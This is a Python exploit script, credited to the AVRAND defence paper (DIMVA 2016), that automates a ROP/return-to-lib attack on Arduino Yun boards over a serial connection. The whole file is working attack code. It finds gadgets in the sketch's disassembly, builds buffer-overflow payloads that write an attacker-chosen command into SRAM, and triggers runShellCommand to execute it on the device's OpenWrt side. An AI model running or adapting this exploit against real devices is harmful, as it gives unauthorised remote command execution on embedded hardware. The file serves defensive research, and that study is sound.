#!/usr/bin/python

########################################################################################################## 
#               																				         #
#               																				         #
#             Copyright 2016 Sergio Pastrana (spastran [at] inf [dot] uc3m [dot] es) 					 #
#               																				         #
# This script automatizes a ROP-ReturnToLib attack against Arduino Yun devices, as detailed in the paper #
# "AVRAND: A Software-Based Defense Against Code Reuse Attacks for AVR Embedded Devices" presented 		 #
# at DIMVA 2016 conference in San Sebastian, Spain 														 #
#               																				         #
# More info at www.seg.inf.uc3m.es/~spastran/avrand 													 #	
#               																				         #
#               																				         #
##########################################################################################################

import subprocess
import os
from math import floor
import serial
import time
import sys
import argparse

#BUFF_SIZE=20;
addresses= {
'stack_mov_1':'0x000x00',
'stack_mov_2':'0x000x00',
'store_data':'0x000x00', 
'load_data':'0x000x00', 
'reset_chip_1':'0x000x00', 
'reset_chip_2':'0x000x00', 
'load_arguments':'0x000x00', 
'runShellCommand':'0x000x00', 
'processObject':'0x000x00'
};

parser = argparse.ArgumentParser(description="This program targets Arduino Yun devices. It allows to remotely execute commands in Openwrt by exploiting the Atmega chip of an Arduino Yun",formatter_class=argparse.ArgumentDefaultsHelpFormatter);


#parser.add_argument("command", help="The full command and arguments you want to inject/execute (between quotes)");
parser.add_argument("-sketch", help="The name of the sketch", default="sample", dest="sketch_name");
parser.add_argument("-addr", help="Address (in hexadecimal) of SRAM memory where the command is being stored. (Must be below the .bss section).", default="0x05f0", dest="memory_address");
parser.add_argument("-bin", help="Directory where binaries are stored", default="ArduinoProject/bin/sample/yun/",dest="bin_dir");
parser.add_argument("-src", help="Directory where source files are stored", default="ArduinoProject/src/sample/",dest="src_dir");
parser.add_argument("-port", help="Serial port from which the device is listening", default="/dev/cu.usbmodem1411",dest="SERIAL_PORT");
parser.add_argument("-rate", help="Data rate in bits per second (baud) for serial data transmission", default="9600",dest="BAUD_RATE",type=int);
parser.add_argument("-bsize", help="Size of the buffer which is overwritten", default="20",dest="BUFF_SIZE",type=int);
parser.add_argument("-baddr", help="Address of the buffer which is overwritten", default="0x0adf",dest="buff_address");
parser._optionals.title="Optional arguments"

required=parser.add_argument_group('Modes of operation');
group=required.add_mutually_exclusive_group(required=True);
group.add_argument("-c", "--compile", help="Compiles the source code", action="store_true");
group.add_argument("-u", "--upload", help="Uploads the sketch into the arduino", action="store_true");
group.add_argument("-x", "--execute", help="Execute the COMMAND provided (add arguments by enclosing it between quotes)",dest="command");
args=parser.parse_args();

sketch_name=args.sketch_name;
bin_dir=args.bin_dir;
src_dir=args.src_dir;
SERIAL_PORT=args.SERIAL_PORT;
BAUD_RATE=args.BAUD_RATE;
BUFF_SIZE=args.BUFF_SIZE;
buff_address=args.buff_address;

command=args.command;

def formatAddress(address):
	current=address.split("0x")[1];
	if (len(current)==3):
		current="0"+current;
	current="0x"+current[:2]+"0x"+current[2:]
	return current;

memory_address=formatAddress(args.memory_address);
buff_address=formatAddress(args.buff_address);

d='\\x';


def sendPayloadToDevice (ser, payload):
	global d;
	list=[];
	for data in payload.split(d):
		if (data):
			list.append(int("0x"+data,16));
	ser.write(list)
def injectPayloadInMemory():
	capacity=floor((BUFF_SIZE-6)/6);
	print "Capacity:",capacity;
	dataPosition=0;
	where=capacity;
	startAddress=(int("0x"+h(memory_address)+l(memory_address),16)-2);
	#address=formatAddress(hex(startAddress));
	address=startAddress;
	print "Injecting command...\n\t Command: "+command+"\n\t Address: 0x"+h(memory_address)+l(memory_address);
	while (dataPosition<len(prepareCommandPayload())):
		payload,address,dataPosition=getInjectData(where,address,dataPosition);
		where=where+capacity;
		ser = serial.Serial(SERIAL_PORT, BAUD_RATE);

		if not ser.isOpen():
			print "Cannot inject command in memory: Error trying to open the serial port. Aborting"
			exit(-1)

		sendPayloadToDevice(ser,"\\x34"); # Number 4, to trigger 4th option in the menu of the sample.ino
		time.sleep(1.5);
		print payload;
		sendPayloadToDevice(ser,payload);
		time.sleep(3.5);
		ser.close();
		time.sleep(1);
	print "Done!"
def runShellCommand():
	global d;
	stringAddress=(int("0x"+h(memory_address)+l(memory_address),16)+len(command)+1);
	stringAddress=formatAddress(hex(stringAddress));
	payload=d+h(addresses["load_arguments"])+d+l(addresses["load_arguments"]);
	payload=payload+d+h(addresses["processObject"])+d+l(addresses["processObject"]);
	payload=payload+d+h(stringAddress)+d+l(stringAddress);
	i=0;
	while i<7: 
		i+=1;
		payload=payload+d+"00";
	payload=payload+d+h(addresses["runShellCommand"])+d+l(addresses["runShellCommand"]);		
	payload=payload+d+h(addresses["reset_chip_1"])+d+l(addresses["reset_chip_1"]);
	payload=payload+d+h(addresses["reset_chip_2"])+d+l(addresses["reset_chip_2"]);
	i=19
	while (i<BUFF_SIZE+4):
		payload=payload+d+"00";
		i+=1;
	payload=payload+d+h(addresses["stack_mov_1"])+d+l(addresses["stack_mov_1"]);
	payload=payload+d+h(buff_address)+d+l(buff_address);
	payload=payload+d+h(addresses["stack_mov_2"])+d+l(addresses["stack_mov_2"]);
	print "Running command...";
	ser = serial.Serial(SERIAL_PORT, BAUD_RATE);

	if not ser.isOpen():
		print "Cannot run shell command. Error trying to open the serial port. Aborting"
		exit(-1)

	sendPayloadToDevice(ser, "\\x34"); # number 4
	time.sleep(1.5);
	#print payload;
	sendPayloadToDevice(ser, payload);
	time.sleep(3.5);
	ser.close()
	time.sleep(1)

def getInjectData(number,currentAddress,initPosition):
	global d;
	payload=d+h(addresses["load_data"])+d+l(addresses["load_data"]);
	data=prepareCommandPayload();
	i=initPosition;
	j=2;
	while i<number*4:
		current=formatAddress(hex(currentAddress));
		payload=payload+d+h(current)+d+l(current);
		j+=2;
		if (data[(i+2):(i+4)]):
			payload=payload+d+data[(i+2):(i+4)];
		else:
			#padding
			payload=payload+d+"00";
		j+=1;
		if (data[(i):(i+2)]):
			payload=payload+d+data[i:i+2];
		else:
			payload=payload+d+"00";
		j+=1;	
		payload=payload+d+h(addresses["store_data"])+d+l(addresses["store_data"]);
		j+=2;
		currentAddress+=2
		i+=4
	payload=payload+d+"00"+d+"00"+d+"00"+d+"00";
	j+=4;
	payload=payload+d+h(addresses["reset_chip_1"])+d+l(addresses["reset_chip_1"]);
	payload=payload+d+h(addresses["reset_chip_2"])+d+l(addresses["reset_chip_2"]);
	j+=4;
	while (j<BUFF_SIZE+4):
		payload=payload+d+"00";
		j+=1;
	payload=payload+d+h(addresses["stack_mov_1"])+d+l(addresses["stack_mov_1"]);
	payload=payload+d+h(buff_address)+d+l(buff_address);
	payload=payload+d+h(addresses["stack_mov_2"])+d+l(addresses["stack_mov_2"]);

	return payload, currentAddress,i;
def l(address):
	return address.split("0x")[2];
def h(address):
	return address.split("0x")[1];
def prepareCommandPayload():
	hexRepre=command.encode("hex");
	length= hex(len(command)).split("0x")[1];
	i=len(length);
	while (i<4):
		i+=1;
		length='0'+length;
	payload=hexRepre+"00"+l(memory_address)+h(memory_address)+length[2:]+length[:2]+length[2:]+length[:2];
	if ((len(payload)/2)%2==1):
		payload=payload+"00";
	return payload;

def openDisasm():
   file=bin_dir+sketch_name+".lss";
   try:
   	f = open(file, 'r');	
   except Exception, e:
   	print "**ERROR: "+sketch_name+".lss not found. Please compile the sketch";
   	exit();
   return f;
def uploadSketch():
	currentPath=os.getcwd();
	os.chdir(src_dir);
	cmd=['make','upload'];
	subprocess.Popen(cmd);
	os.chdir(currentPath);
def compileCode():
	currentPath=os.getcwd();
	os.chdir(src_dir);
	cmd=['make','disasm'];
	subprocess.Popen(cmd);
	os.chdir(currentPath);
def findGadget (gadget, file):
	pos=file.tell();
	possible=file.tell();
	line=file.readline();
	found=False;
	numFound=0;
	#while line and not found:
	while line:
		if gadget[0] in line:
			i=1;
			line=file.readline();
			while i<len(gadget) and ((gadget[i] in line) or (gadget[i]=='useless') or "jmp" in line):
				i+=1;
				line=file.readline();
			if (i==len(gadget)):
				file.seek(possible);
				if not found:
					offset=file.readline().split()[0].split(":")[0];
				found=True;	
				numFound+=1;
		possible=file.tell();   
		file.seek(pos);
		line=file.readline();
		pos=file.tell();
	if found:
		print "\tFound gadget "+str(numFound)+" times";
		return offset

def findStackMov1():
	gadget=['pop\tr29', 
			'pop\tr28', 
			'ret'];
	file=openDisasm();
	address=findGadget(gadget,file);
	if (not address):
		print "stack_mov_1 not found!";
		return;
	if len(address) == 2:
		address='00'+address;
	elif len(address)==3:
		address='0'+address;
	pcAddress=address2pc(int(address[:2],16),int(address[2:],16));
	addresses['stack_mov_1']=pcAddress;

def findStackMov2():
	gadget=['in\tr0, 0x3f', 
			'cli', 
			'out\t0x3e, r29', 
			'out\t0x3f, r0', 
			'out\t0x3d, r28', 
			'useless', 
			'ret'];
	file=openDisasm();
	address=findGadget(gadget,file);
	if (not address):
		print "stack_mov_2 not found!";
		return;
	if len(address) == 2:
		address='00'+address;
	elif len(address)==3:
		address='0'+address;
	pcAddress=address2pc(int(address[:2],16),int(address[2:],16));
	addresses['stack_mov_2']=pcAddress;

def findStoreData():
	gadget=['std\tY+3, r17', 
			'std\tY+2, r16', 
			'useless', 
			'rjmp\t.+2'];
	file=openDisasm();
	address=findGadget(gadget,file);
	if (not address):
		print "store_data not found!";
		return;
	if len(address) == 2:
		address='00'+address;
	elif len(address)==3:
		address='0'+address;
	pcAddress=address2pc(int(address[:2],16),int(address[2:],16));
	addresses['store_data']=pcAddress;
def findLoadData():
	gadget=['pop\tr29', 
			'pop\tr28',
			'pop\tr17', 
			'pop\tr16',  
			'ret'];
	file=openDisasm();
	address=findGadget(gadget,file);
	if len(address) == 2:
		address='00'+address;
	elif len(address)==3:
		address='0'+address;
	pcAddress=address2pc(int(address[:2],16),int(address[2:],16));
	addresses['load_data']=pcAddress;
def findResetChip1():
	gadget=['ldi\tr18, 0x0B',
			'ldi\tr24, 0x18',
			'ldi\tr25, 0x00',
			'in\tr0, 0x3f', 
			'cli',
			'wdr', 
			'sts\t0x0060, r24', 
			'out\t0x3f, r0', 
			'sts\t0x0060, r18'];
	file=openDisasm();
	address=findGadget(gadget,file);
	if (not address):
		print "reset_chip1 not found!";
		return;
	if len(address) == 2:
		address='00'+address;
	elif len(address)==3:
		address='0'+address;
	pcAddress=address2pc(int(address[:2],16),int(address[2:],16));
	addresses['reset_chip_1']=pcAddress;
def findResetChip2():
	gadget=['rjmp\t.-2'];
	file=openDisasm();
	for line in file:
		pass
	last = line
	address= last.split()[0].split(":")[0];	
	if (not address):
		print "reset_chip_2 not found!";
		return;
	#address=findGadget(gadget,file);
	if len(address) == 2:
		address='00'+address;
	elif len(address)==3:
		address='0'+address;
	pcAddress=address2pc(int(address[:2],16),int(address[2:],16));
	addresses['reset_chip_2']=pcAddress;
def findLoadArguments():
	gadget=['pop\tr25', 
			'pop\tr24',
			'pop\tr23', 
			'pop\tr22', 
			'pop\tr21', 
			'pop\tr20', 
			'pop\tr19', 
			'pop\tr18', 
			'pop\tr0', 
			'out\t0x3f, r0', 
			'pop\tr0', 
			'pop\tr1',        	       	 
			'reti'];	
	file=openDisasm();
	address=findGadget(gadget,file);
	if (not address):
		print "load_arguments not found!";
		return;
	if len(address) == 2:
		address='00'+address;
	elif len(address)==3:
		address='0'+address;
	pcAddress=address2pc(int(address[:2],16),int(address[2:],16));
	addresses['load_arguments']=pcAddress;

def findRunShellCommand():
	symbolTable=subprocess.Popen (["avr-objdump", "-t", bin_dir+sketch_name+".elf"],stdout=subprocess.PIPE);
	addressInBinary=""
	tmp=""
	while True:
		line = symbolTable.stdout.readline();
		if line != '':
			if ("runShellCommandE" in line.rstrip()):
				tmp=line.rstrip().split()[0][4:];
		else:
			break
	if (tmp==""):
		print "runShellCommand function not found!";
		return;
	if (tmp[0]=="0" and tmp[1]=="0"):
		addressInBinary=tmp[2:];
	elif (tmp[0]=="0"):
		addressInBinary=tmp[1:];
	else:
		addressInBinary=tmp;
	print "RunShellCommand is in ",addressInBinary;
	pcAddress=address2pc(int(addressInBinary[:2],16),int(addressInBinary[2:],16));
	print "PCADDRESS ",pcAddress;
	addresses['runShellCommand']=pcAddress;
def findProcessObject():
	symbolTable=subprocess.Popen (["avr-objdump", "-t", bin_dir+sketch_name+".elf"],stdout=subprocess.PIPE);
	addressInBinary=""
	tmp=""
	while True:
		line = symbolTable.stdout.readline();
		if line != '':
			if (" processobject" in line.rstrip()):
				tmp=line.rstrip().split()[0][4:];
		else:
			break
	if (tmp==""):
		print "Warning: Process Object not found as global variable!";
		return;
	addressInBinary=tmp;
	addresses['processObject']="0x"+addressInBinary[0:2]+"0x"+addressInBinary[2:4];
	print(str(addresses['processObject']))

def address2pc(a,b):
	wd = (a << 8) | b;
	dividend=wd/64;
	remainder=(wd%64)/2;
	dividend=dividend<<5;
	p=remainder & 0x001F;
	q=dividend & 0xFFE0;
	pc=p | q;
	first=(pc & 0xFF00)>>8;
	second=(pc & 0x00FF);
	#print hex(a),hex(b),"->",hex(first),hex(second);
	tf=hex(first);
	if (len(tf)==3):
		tf="0x0"+hex(first)[2:];
	ts=hex(second);
	if (len(ts)==3):
		ts="0x0"+hex(second)[2:];
	return tf+ts;
def pc2address(a,b):
	wd = (a << 8) | b;
	p=wd & 0x001F;
	q=wd & 0xFFE0;
	q=q>>5;
	address=q*64+p*2;
	first=(address & 0xFF00)>>8;
	second=(address & 0x00FF);
	#print hex(a),hex(b),"->",hex(first),hex(second);
	tf=hex(first);
	if (len(tf)==3):
		tf="0x0"+hex(first)[2:];
	ts=hex(second);
	if (len(ts)==3):
		ts="0x0"+hex(second)[2:];
	return tf+ts;

if (args.compile):
	compileCode();
elif (args.upload):
	uploadSketch();
else:
	print "stack_mov_1";
	findStackMov1();
	print "stack_mov_2";
	findStackMov2();
	print "reset_chip_1";
	findResetChip1();
	print "reset_chip_2";
	findResetChip2();
	print "load_arguments";
	findLoadArguments();
	print "load_data";
	findLoadData();
	print "store_data";
	findStoreData();
	findProcessObject();
	findRunShellCommand();
	for key, value in addresses.iteritems() :	
		if (value):
			address=pc2address(int(h(value),16),int(l(value),16));
			print key, "0x"+address.split("0x")[1]+address.split("0x")[2];
	injectPayloadInMemory();
	runShellCommand();





